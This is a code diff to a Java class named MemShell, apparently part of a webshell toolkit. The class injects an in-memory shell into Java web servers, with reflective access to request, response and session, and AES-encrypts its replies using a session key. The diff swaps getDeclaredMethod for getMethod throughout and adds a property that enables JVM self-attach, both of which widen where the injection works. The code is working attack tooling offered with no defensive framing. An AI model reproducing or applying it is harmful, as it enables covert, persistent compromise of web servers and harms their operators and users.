@@ -39,6 +39,7 @@ public class MemShell {
       label99: {
          try {
             var14 = true;
+            System.setProperty("jdk.attach.allowAttachSelf", "true");
             this.fillContext(obj);
             if (type.equals("Agent")) {
                try {
@@ -67,11 +68,11 @@ public class MemShell {
          } finally {
             if (var14) {
                try {
-                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getMethod("write", byte[].class);
                   write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.getClass().getDeclaredMethod("flush").invoke(so);
-                  so.getClass().getDeclaredMethod("close").invoke(so);
+                  so.getClass().getMethod("flush").invoke(so);
+                  so.getClass().getMethod("close").invoke(so);
                } catch (Exception var15) {
                }
 
@@ -79,11 +80,11 @@ public class MemShell {
          }
 
          try {
-            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getMethod("write", byte[].class);
             write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.getClass().getDeclaredMethod("flush").invoke(so);
-            so.getClass().getDeclaredMethod("close").invoke(so);
+            so.getClass().getMethod("flush").invoke(so);
+            so.getClass().getMethod("close").invoke(so);
          } catch (Exception var16) {
          }
 
@@ -91,11 +92,11 @@ public class MemShell {
       }
 
       try {
-         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
-         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getMethod("write", byte[].class);
          write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.getClass().getDeclaredMethod("flush").invoke(so);
-         so.getClass().getDeclaredMethod("close").invoke(so);
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
       } catch (Exception var17) {
       }
 
@@ -225,9 +226,9 @@ public class MemShell {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
          this.Session = objMap.get("session");
@@ -235,7 +236,7 @@ public class MemShell {
          this.Request = objMap.get("request");
       }
 
-      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -265,7 +266,7 @@ public class MemShell {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -278,7 +279,7 @@ public class MemShell {
       Object result = null;
 
       try {
-         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
       } catch (Exception var5) {
       }
 
@@ -287,7 +288,7 @@ public class MemShell {
 
    private void sessionSetAttribute(Object session, String key, Object value) {
       try {
-         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
       } catch (Exception var5) {
       }
 
